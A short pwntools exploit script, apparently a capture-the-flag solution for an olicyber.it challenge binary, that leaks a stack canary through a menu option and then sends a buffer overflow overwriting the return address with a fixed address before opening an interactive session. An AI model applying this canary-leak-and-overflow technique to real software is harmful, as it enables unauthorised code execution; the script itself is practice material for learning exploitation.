from pwn import *
elf = ELF('./chall')
context.binary = elf
context.terminal = ()
if args.REMOTE:
    p = remote('baas.challs.olicyber.it', 38061)
elif args.GDB:
    p = gdb.debug([elf.path],'''
                  b main
                  c
                  '''
                  )
else:
    p = process([elf.path])
# buff 40

p.sendlineafter(b'option: ',b'2')

p.sendlineafter(b'data: ',b'a'*32 + p32(4919))

p.sendlineafter(b'option: ',b'3')
canary = p.recvline().strip()
canary = canary.decode().split(' ')[-1].replace('0x','')
print(canary)
p.sendlineafter(b'option: ',b'1')
overflow = b'a'*40 + p64(int(canary,16)) + b'a'*8 + p64(0x401290)
p.sendlineafter(b'data: ', overflow)
p.sendlineafter(b'option: ',b'4')
p.interactive()


